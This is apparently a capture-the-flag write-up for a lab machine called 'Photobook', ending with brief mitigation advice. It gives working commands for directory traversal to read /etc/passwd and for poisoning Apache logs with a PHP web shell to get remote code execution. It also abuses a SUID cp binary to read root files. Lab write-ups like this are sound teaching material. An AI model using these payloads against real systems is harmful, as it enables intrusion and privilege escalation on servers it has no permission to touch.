---
title: "Writeup: Photobook"
date: "2026-04-08"
author: "Dock & Root"
tags: ["Writeup", "Local File Inclusion", "Log Poisoning", "SUID", "Easy"]
thumbnail: "../img/unnamed.png"
---

# Writeup: Photobook

This walkthrough details the exploitation of the **Photobook** machine, dealing with Local File Inclusion (LFI) via `include()` in PHP, leading to Remote Code Execution via log poisoning, and ending in privilege escalation using a SUID binary.

## 1. Enumeration

Scanning the target machine reveals an Apache standard web server running on port 8002.

```bash
nmap -sV -sC 127.0.0.1 -p 8002
```

We see a photobook developer blog with simple navigation: `Home` and `About`. Clicking the links exposes a fascinating query parameter in the URL: `http://127.0.0.1:8002/index.php?page=about.php`.

## 2. Analyzing the Web Application

The `page` parameter determines which file is dynamically included into the HTML response. If we test standard LFI payloads like `?page=../../../../../etc/passwd`, we get a directory traversal that prints out the `/etc/passwd` file!

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

## 3. Exploitation (Remote Code Execution)

With LFI confirmed, we need to escalate this to RCE. A common technique is Apache access log poisoning. The Apache logs are stored at `/var/log/apache2/access.log`.

We send a request with a crafted `User-Agent` that contains valid PHP code:
```bash
curl -A "<?php system(\$_GET['cmd']); ?>" http://127.0.0.1:8002/index.php
```

Next, we include the access log file through the LFI vulnerability and append our `cmd` parameter:
```text
http://127.0.0.1:8002/index.php?page=/var/log/apache2/access.log&cmd=id
```

**Output:**
```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We have RCE! We can now grab our user flag by reading `/home/www-data/user.txt`.
Result: `HTB{lfi_log_poisoning_woo}`

## 4. Capturing the Flag (SUID cp)

To elevate to root, we must look for misconfigurations on the system. Running `find / -perm -4000 2>/dev/null` lists SUID binaries.

```text
/bin/mount
/bin/ping
/bin/cp    <-- Highly unusual!
/bin/su
```

The `/bin/cp` binary has the SUID bit set, which means it runs as root regardless of who executes it. We can simply use it to copy the root flag to a readable location!

```bash
/bin/cp /root/root.txt /tmp/root.txt
cat /tmp/root.txt
```

**Flag:**
```text
HTB{suid_cp_for_the_win}
```

---

## 🛡️ Mitigation & Patching

1. **LFI:** Never pass unsanitized user input directly to `include()`, `require()`, or similar functions in PHP. Use an allowlist instead.
2. **SUID Binaries:** Ensure system binaries like `/bin/cp` do not have the SUID bit set unless absolutely necessary to the operating system's functions. 
